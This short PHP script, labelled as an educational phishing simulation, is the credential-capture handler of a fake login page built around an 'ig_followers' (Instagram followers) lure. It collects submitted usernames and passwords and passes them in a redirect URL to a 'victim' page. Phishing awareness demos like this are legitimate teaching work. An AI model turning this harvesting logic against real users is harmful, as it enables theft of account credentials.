<?php
// This simulation is created by Atharv Hogade. Do not misuse it.

// Educational simulation redirect
$user = isset($_POST['email']) ? $_POST['email'] : (isset($_POST['username']) ? $_POST['username'] : (isset($_POST['login']) ? $_POST['login'] : 'victim_user@example.com'));
$pass = isset($_POST['password']) ? $_POST['password'] : (isset($_POST['pass']) ? $_POST['pass'] : (isset($_POST['passwd']) ? $_POST['passwd'] : 'Password123'));
$brand = 'ig_followers';
header("Location: ../victim.html?brand=" . urlencode($brand) . "&user=" . urlencode($user) . "&pass=" . urlencode($pass));
exit();
?>
